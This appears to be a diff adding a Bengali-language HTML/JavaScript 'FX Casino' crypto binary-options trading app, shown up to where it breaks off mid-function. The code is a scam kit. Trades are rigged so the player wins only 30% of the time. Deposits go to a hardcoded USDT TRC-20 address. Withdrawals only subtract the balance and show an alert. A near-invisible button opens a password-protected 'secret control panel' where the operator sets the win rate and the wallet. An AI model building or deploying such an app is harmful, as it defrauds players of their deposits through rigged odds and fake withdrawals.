@@ -1,0 +1,485 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FX Casino - Ultimate Trading Platform</title>
+    <style>
+        /* প্রিমিয়াম ডার্ক এবং গোল্ডেন থিম */
+        :root {
+            --bg-color: #0b0e11;
+            --card-bg: #181a20;
+            --primary-gold: #ffde7d;
+            --green-btn: #0ecb81;
+            --red-btn: #f6465d;
+            --text-main: #eaecef;
+            --border-color: #2b2f36;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-main);
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        /* বটম নেভিগেশন বার (ট্যাব সিস্টেম) */
+        .bottom-nav {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            background-color: var(--card-bg);
+            display: flex;
+            justify-content: space-around;
+            padding: 15px 0;
+            border-top: 1px solid var(--border-color);
+            z-index: 100;
+        }
+
+        .nav-btn {
+            background: none;
+            border: none;
+            color: #848e9c;
+            font-size: 14px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: 0.3s;
+        }
+
+        .nav-btn.active {
+            color: var(--primary-gold);
+        }
+
+        /* অ্যাপের প্রতিটি সেকশন কন্ট্রোল */
+        .app-section {
+            display: none;
+            padding: 20px;
+            padding-bottom: 90px; 
+            max-width: 480px;
+            margin: 0 auto;
+        }
+
+        .app-section.active {
+            display: block;
+        }
+
+        /* স্টাইলিশ কার্ড ও ইনপুট বক্স */
+        .card {
+            background-color: var(--card-bg);
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 20px;
+            border: 1px solid var(--border-color);
+            text-align: center;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.3);
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 12px 0;
+            background-color: #2b2f36;
+            border: 1px solid #474d57;
+            border-radius: 6px;
+            color: #fff;
+            box-sizing: border-box;
+            font-size: 14px;
+        }
+
+        input:focus {
+            border-color: var(--primary-gold);
+            outline: none;
+        }
+
+        button.action-btn {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #ffd700, #b8860b);
+            color: #000;
+            border: none;
+            border-radius: 6px;
+            font-weight: bold;
+            cursor: pointer;
+            font-size: 16px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.2);
+        }
+
+        /* লাইভ ট্রেডিং এরিয়া */
+        .balance-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+
+        .chart-box {
+            height: 250px;
+            background-color: #05070a;
+            border-radius: 8px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #3a3f47;
+            position: relative;
+            font-weight: bold;
+            border: 1px solid #222;
+            overflow: hidden;
+        }
+
+        /* ক্যান্ডেলের ওপর লাইভ ব্যাজ */
+        .live-amount-badge {
+            position: absolute;
+            top: 40%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: rgba(24, 26, 32, 0.9);
+            padding: 8px 15px;
+            border-radius: 20px;
+            color: var(--primary-gold);
+            border: 1px solid var(--primary-gold);
+            display: none;
+            font-size: 14px;
+            z-index: 10;
+            box-shadow: 0 0 10px rgba(255, 222, 125, 0.5);
+        }
+
+        .trade-buttons {
+            display: flex;
+            gap: 15px;
+            margin-top: 15px;
+        }
+
+        .trade-btn {
+            flex: 1;
+            padding: 15px;
+            border: none;
+            border-radius: 8px;
+            font-size: 18px;
+            font-weight: bold;
+            color: #fff;
+            cursor: pointer;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.2);
+            transition: 0.2s;
+        }
+
+        .trade-btn:disabled {
+            background-color: #474d57 !important;
+            color: #848e9c;
+            cursor: not-allowed;
+            box-shadow: none;
+        }
+
+        .btn-buy { background-color: var(--green-btn); }
+        .btn-sell { background-color: var(--red-btn); }
+
+        /* কিউআর কোড এবং ওয়ালেট সেকশন */
+        .qr-box img {
+            width: 180px;
+            height: 180px;
+            margin: 15px 0;
+            border: 4px solid #fff;
+            border-radius: 8px;
+        }
+
+        .crypto-address {
+            background-color: #2b2f36;
+            padding: 12px;
+            word-break: break-all;
+            border-radius: 6px;
+            font-size: 13px;
+            margin: 12px 0;
+            border: 1px dashed var(--primary-gold);
+            color: #fff;
+        }
+
+        .timer-display {
+            color: var(--red-btn);
+            font-weight: bold;
+            margin-top: 5px;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ১. অথেন্টিকেশন সেকশন (লগইন / রেজিস্টার) -->
+    <div id="auth-section" class="app-section active">
+        <div class="card" style="margin-top: 50px;">
+            <h2 style="color: var(--primary-gold); letter-spacing: 2px;">FX CASINO LOG IN</h2>
+            <p style="color: #848e9c; font-size: 13px;">আপনার ইমেইল ও পাসওয়ার্ড দিয়ে অ্যাকাউন্ট খুলুন</p>
+            <input type="email" id="auth-email" placeholder="আপনার ইমেইল অ্যাড্রেস">
+            <input type="password" id="auth-pass" placeholder="পাসওয়ার্ড তৈরি করুন">
+            <button class="action-btn" onclick="handleAuth()">লগইন / সাইন আপ</button>
+        </div>
+    </div>
+
+    <!-- ২. মূল ট্রেডিং সেকশন -->
+    <div id="trading-section" class="app-section">
+        <div class="balance-header">
+            <div>UID: <span id="user-uid" style="color: var(--primary-gold); font-weight: bold;">000000</span></div>
+            <div style="text-align: right;">
+                <span style="font-size: 11px; color: #848e9c; letter-spacing: 1px;">WALLET BALANCE</span><br>
+                <span style="font-size: 22px; font-weight: bold; color: var(--primary-gold);">$<span id="user-balance">1000.00</span></span>
+            </div>
+        </div>
+
+        <!-- মার্কেট চার্ট কার্ড -->
+        <div class="card" style="padding: 12px;">
+            <div style="display: flex; justify-content: space-between; font-size: 14px; margin-bottom: 8px;">
+                <span style="font-weight: bold; color: #fff;">BTC/USDT (Crypto Market)</span>
+                <span style="color: var(--green-btn); font-weight: bold;">Return: 85%</span>
+            </div>
+            
+            <div class="chart-box" id="chart-area">
+                <!-- ক্যান্ডেলের ওপর লাইভ শো অ্যামাউন্ট -->
+                <div class="live-amount-badge" id="live-bet-badge">$0.00 (BUY)</div>
+                <span style="opacity: 0.15; font-size: 14px;">[ লাইভ ক্যান্ডেলস্টিক চার্ট চলমান... ]</span>
+            </div>
+        </div>
+
+        <!-- ট্রেড কন্ট্রোল কার্ড -->
+        <div class="card">
+            <span style="font-size: 12px; color:#848e9c; font-weight: bold;">STAKE AMOUNT ($)</span>
+            <input type="number" id="stake-amount" value="100" style="text-align: center; font-size: 22px; font-weight: bold; color: var(--primary-gold);">
+            
+            <div class="trade-buttons">
+                <button id="buy-btn" class="trade-btn btn-buy" onclick="placeTrade('BUY')">BUY<br><span style="font-size: 11px; font-weight: normal; opacity: 0.8;">Higher</span></button>
+                <button id="sell-btn" class="trade-btn btn-sell" onclick="placeTrade('SELL')">SELL<br><span style="font-size: 11px; font-weight: normal; opacity: 0.8;">Lower</span></button>
+            </div>
+            <div id="lock-timer-msg" class="timer-display" style="display: none;">লক টাইম বাকি: <span id="secs">120</span> সেকেন্ড</div>
+        </div>
+    </div>
+
+    <!-- ৩. ডিপোজিট সেকশন -->
+    <div id="deposit-section" class="app-section">
+        <div class="card">
+            <h3 style="color: var(--primary-gold);">Tether (USDT TRC-20) Deposit</h3>
+            <p style="color: #848e9c; font-size: 13px;">ডিপোজিট করার জন্য নিচে অ্যামাউন্ট বসিয়ে রিকোয়েস্ট করুন।</p>
+            <input type="number" id="dep-amount" placeholder="অ্যামাউন্ট লিখুন (যেমন: 50)">
+            <button class="action-btn" onclick="generateDepositQR()">ডিপোজিট এড্রেস জেনারেট করুন</button>
+
+            <!-- স্ক্রিনশটের মতো গেটওয়ে এরিয়া -->
+            <div id="qr-pay-area" style="display: none; margin-top: 20px;">
+                <div class="timer-display" style="margin-bottom: 10px;">Complete payment in: 14:59</div>
+                <div class="qr-box">
+                    <img id="admin-qr-img" src="" alt="Crypto QR Code">
+                </div>
+                <span style="font-size: 12px; color: #848e9c;">USDTT address to pay:</span>
+                <div class="crypto-address" id="admin-usdt-address">অ্যাড্রেস লোড হচ্ছে...</div>
+                
+                <span style="font-size: 12px; color: #848e9c;">Amount to pay:</span>
+                <div class="crypto-address" id="req-amount-show" style="font-weight: bold; color: var(--primary-gold);">0.00 USDT</div>
+                <p style="font-size: 11px; color: var(--green-btn);">পেমেন্ট সম্পূর্ণ করার পর সিস্টেম অটো ভেরিফাই করবে।</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- ৪. উইথড্র সেকশন -->
+    <div id="withdraw-section" class="app-section">
+        <div class="card">
+            <h3 style="color: var(--red-btn);">USDT TRC-20 Withdraw</h3>
+            <p style="color: #848e9c; font-size: 13px;">আপনার উপার্জিত ডলার ওয়ালেটে উইথড্র করুন।</p>
+            <input type="text" id="wit-address" placeholder="আপনার USDT (TRC-20) ওয়ালেট এড্রেস">
+            <input type="number" id="wit-amount" placeholder="উইথড্র অ্যামাউন্ট ($)">
+            <button class="action-btn" style="background: var(--red-btn); color: #fff;" onclick="handleWithdraw()">উইথড্র রিকোয়েস্ট পাঠান</button>
+        </div>
+    </div>
+
+    <!-- ৫. লকড এডমিন প্যানেল স্ক্রিন -->
+    <div id="admin-section" class="app-section">
+        <div class="card" style="border: 1px solid var(--primary-gold);">
+            <h3 style="color: var(--primary-gold); letter-spacing: 1px;">SECRET CONTROL PANEL</h3>
+            <p style="color: #848e9c; font-size: 12px;">এখান থেকে অ্যাপের সবকিছু লাইভ নিয়ন্ত্রণ করুন।</p>
+            <hr style="border-color: #333;">
+            
+            <label style="display:block; text-align:left; margin-top:10px; font-size:12px;">এডমিন USDT (TRC-20) অ্যাড্রেস:</label>
+            <input type="text" id="cfg-address" value="TTmfRpr8QiCxyK2LJqToyeWqJ69SFP35Za">
+            
+            <label style="display:block; text-align:left; font-size:12px;">এডমিন QR ইমেজ লিঙ্ক (Direct URL):</label>
+            <input type="text" id="cfg-qr" value="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=TTmfRpr8QiCxyK2LJqToyeWqJ69SFP35Za">
+            
+            <label style="display:block; text-align:left; font-size:12px;">অ্যান্টি-হোয়েল মোড (উইন রেট কন্ট্রোল %):</label>
+            <input type="number" id="cfg-winrate" value="30" placeholder="যেমন: ৩০ মানে কম মেম্বাররা ৩০% চান্স পাবে জিতার">
+            <p style="font-size:10px; color:#848e9c; text-align:left; margin:0 0 10px 0;">* কম মেম্বার যেদিকে থাকবে সেদিক জেতার জন্য এটি ব্যাকএন্ডে সয়ংক্রিয়ভাবে কাজ করবে।</p>
+            
+            <button class="action-btn" onclick="saveAdminSettings()">সেটিংস আপডেট করুন</button>
+        </div>
+    </div>
+
+    <!-- বটম মেনু নেভিগেশন বার -->
+    <div class="bottom-nav" id="main-nav-bar" style="display: none;">
+        <button class="nav-btn active" onclick="switchTab('trading-section', this)">Trading</button>
+        <button class="nav-btn" onclick="switchTab('deposit-section', this)">Deposit</button>
+        <button class="nav-btn" onclick="switchTab('withdraw-section', this)">Withdraw</button>
+        <button class="nav-btn" style="opacity: 0.02; cursor: default;" onclick="triggerSecretAdmin()">.</button> <!-- সম্পূর্ণ অদৃশ্য এডমিন গেটওয়ে -->
+    </div>
+
+    <!-- জাভাস্ক্রিপ্ট মূল লজিক ফাইল -->
+    <script>
+        // গ্লোবাল ভেরিয়েবলস ও কনফিগারেশন
+        let currentBalance = 1000.00;
+        let adminAddress = "TTmfRpr8QiCxyK2LJqToyeWqJ69SFP35Za";
+        let adminQR = "https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=TTmfRpr8QiCxyK2LJqToyeWqJ69SFP35Za";
+        let antiWhaleRate = 30; // এডমিন নিয়ন্ত্রিত ডিফল্ট রেট
+        let secretClicks = 0;
+        let isLocked = false;
+
+        // ১. ডেমো সাইন-ইন ও রেমিট আইডি জেনারেশন 
+        function handleAuth() {
+            let email = document.getElementById('auth-email').value;
+            let pass = document.getElementById('auth-pass').value;
+            
+            if(email.includes("@") && pass.length >= 4) {
+                // র্যান্ডম ৬ ডিজিটের ইউনিক ইউজার আইডি তৈরি
+                let randUID = Math.floor(100000 + Math.random() * 900000);
+                document.getElementById('user-uid').innerText = randUID;
+                
+                // স্ক্রিন পরিবর্তন
+                document.getElementById('auth-section').classList.remove('active');
+                document.getElementById('trading-section').classList.add('active');
+                document.getElementById('main-nav-bar').style.display = 'flex';
+            } else {
+                alert("দয়া করে সঠিক ইমেইল এবং ন্যূনতম ৪ অক্ষরের পাসওয়ার্ড দিন।");
+            }
+        }
+
+        // ২. ড্যাশবোর্ডের ট্যাব সুইচিং লজিক
+        function switchTab(sectionId, btnElement) {
+            document.querySelectorAll('.app-section').forEach(sec => sec.classList.remove('active'));
+            document.getElementById(sectionId).classList.add('active');
+            
+            document.querySelectorAll('.nav-btn').forEach(btn => btn.classList.remove('active'));
+            if(btnElement) btnElement.classList.add('active');
+        }
+
+        // ৩. ট্রেডিং লজিক ও ২ মিনিট কমপ্লিট লকআউট সিস্টেম
+        function placeTrade(type) {
+            if(isLocked) return;
+
+            let stake = parseFloat(document.getElementById('stake-amount').value);
+            if(isNaN(stake) || stake <= 0) {
+                alert("সঠিক অ্যামাউন্ট বসান!");
+                return;
+            }
+            if(stake > currentBalance) {
+                alert("আপনার ওয়ালেটে পর্যাপ্ত ব্যালেন্স নেই!");
+                return;
+            }
+
+            // ব্যালেন্স ডিডাক্ট ও ক্যান্ডেলের ওপর লাইভ ডাটা শো
+            currentBalance -= stake;
+            document.getElementById('user-balance').innerText = currentBalance.toFixed(2);
+            
+            let badge = document.getElementById('live-bet-badge');
+            badge.innerText = `$${stake.toFixed(2)} (${type})`;
+            badge.style.display = 'block';
+
+            // বাটন লক করা
+            isLocked = true;
+            document.getElementById('buy-btn').disabled = true;
+            document.getElementById('sell-btn').disabled = true;
+            
+            // টাইমার মেসেজ চালু
+            let timeLeft = 120; // ২ মিনিট = ১২০ সেকেন্ড
+            let timerMsg = document.getElementById('lock-timer-msg');
+            let secsSpan = document.getElementById('secs');
+            timerMsg.style.display = 'block';
+            secsSpan.innerText = timeLeft;
+
+            let countdown = setInterval(() => {
+                timeLeft--;
+                secsSpan.innerText = timeLeft;
+                if(timeLeft <= 0) {
+                    clearInterval(countdown);
+                }
+            }, 1000);
+
+            // ২ মিনিট পর রেজাল্ট প্রসেসিং লজিক (এডমিন কন্ট্রোলড)
+            setTimeout(() => {
+                timerMsg.style.display = 'none';
+                badge.style.display = 'none';
+                
+                // অ্যান্টি-হোয়েল ক্যালকুলেশন (কম মেম্বার যেদিকে সেদিক জিতবে লজিক)
+                let randNum = Math.floor(Math.random() * 100) + 1;
+                let isUserWinner = false;
+
+                if (randNum <= antiWhaleRate) {
+                    isUserWinner = true; // ইউজার উইন
+                }
+
+                if(isUserWinner) {
+                    let totalReturn = stake * 1.85; // ৮৫% প্রফিটসহ রিটার্ন
+                    currentBalance += totalReturn;
+                    alert(`অভিনন্দন! আপনি ট্রেডে জিতেছেন। আপনার একাউন্টে $${totalReturn.toFixed(2)} যোগ হয়েছে।`);
+                } else {
+                    alert(`দুঃখিত! আপনি এই ট্রেডটিতে হেরে গেছেন।`);
+                }
+
+                // আপডেট ব্যালেন্স ও আনলক বাটন
+                document.getElementById('user-balance').innerText = currentBalance.toFixed(2);
+                document.getElementById('buy-btn').disabled = false;
+                document.getElementById('sell-btn').disabled = false;
+                isLocked = false;
+            }, 120000); // ১২০,০০০ মিলিসেকেন্ড = ২ মিনিট
+        }
+
+        // ৪. ডিপোজিট ও ওয়ালেট ডেটা জেনারেশন
+        function generateDepositQR() {
+            let amount = parseFloat(document.getElementById('dep-amount').value);
+            if(amount > 0) {
+                document.getElementById('admin-qr-img').src = adminQR;
+                document.getElementById('admin-usdt-address').innerText = adminAddress;
+                document.getElementById('req-amount-show').innerText = amount.toFixed(4) + " USDT";
+                document.getElementById('qr-pay-area').style.display = 'block';
+            } else {
+                alert("দয়া করে সঠিক ডিপোজিট অ্যামাউন্ট লিখুন।");
+            }
+        }
+
+        // ৫. উইথড্র হ্যান্ডেলার
+        function handleWithdraw() {
+            let address = document.getElementById('wit-address').value;
+            let amount = parseFloat(document.getElementById('wit-amount').value);
+            
+            if(!address || isNaN(amount) || amount <= 0) {
+                alert("দয়া করে সঠিক ওয়ালেট অ্যাড্রেস এবং অ্যামাউন্ট দিন।");
+                return;
+            }
+
+            if(amount <= currentBalance) {
+                currentBalance -= amount;
+                document.getElementById('user-balance').innerText = currentBalance.toFixed(2);
+                alert("আপনার উইথড্র রিকোয়েস্টটি সফলভাবে জমা হয়েছে। অ্যাডমিন রিভিউ করে পেমেন্ট রিলিজ করবে।");
+                document.getElementById('wit-address').value = "";
+                document.getElementById('wit-amount').value = "";
+            } else {
+                alert("উইথড্র করার জন্য আপনার অ্যাকাউন্টে পর্যাপ্ত ব্যালেন্স নেই।");
+            }
+        }
+
+        // ৬. পাসওয়ার্ড প্রটেক্টেড গোপন এডমিন প্যানেল ট্রিগার
+        function triggerSecretAdmin() {
+            secretClicks++;
+            if (secretClicks >= 5) { // বটম বারের একেবারে কোনায় ৫ বার ক্লিক করলে লক বক্স আসবে
+                secretClicks = 0; 
+
+                // আপনার কাস্টম সিক্রেট পাসওয়ার্ডটি নিচে দেওয়া হলো
+                const adminPassword = "ADMIN_SECRET_PASS_2026"; 
+                let enterPassword = prompt("গোপন এডমিন পাসওয়ার্ডটি দিন:");
+
+                if (enterPassword === adminPassword) {
+                    switchTab('admin-section', null);
+                    alert("পাসওয়ার্ড সঠিক! এডমিন কন্ট্রোল রুম ওপেন করা হয়েছে।");
+                } else if (enterPassword !== null) {
+                    alert("ভুল পাসওয়ার্ড! এক্সেস ডিনাইড।");
+                }
+            }
+        }
+
+        // এডমিন সেটিংস সেভ করার ফাংশন
+        function saveAdminSettings() {
+            adminAddress = document.getElementById('cfg-address').value;
+            adminQR = document.getElementById('cfg-qr').value;
+            antiWhaleRate = parseI
